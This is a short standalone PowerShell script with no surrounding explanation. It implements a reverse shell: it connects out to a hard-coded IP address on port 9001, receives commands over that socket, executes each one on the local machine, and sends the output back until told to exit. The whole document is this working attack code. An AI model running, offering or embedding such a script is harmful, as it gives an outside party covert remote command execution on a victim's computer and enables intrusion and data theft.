$socket = New-Object System.Net.Sockets.TcpClient('34.197.201.8', 9001);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$buffer = New-Object System.Byte[] 1024;
$encoding = New-Object System.Text.AsciiEncoding;
do{
    $writer.Write("> ");
    $writer.Flush();
    $read = $null;
    while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}   
    $out = $encoding.GetString($buffer, 0,$read).Replace("`r`n","").Replace("`n","");
    Write-Host $out
    if(!$out.equals("exit") -And $out.length -ne 0){
        $out = $out.split(' ')
        $res = [string](&$out[0] $out[1..$out.length]);
        if($res -ne $null){ $writer.WriteLine($res)}
    }
}While (!$out.equals("exit"))
$writer.close();$socket.close();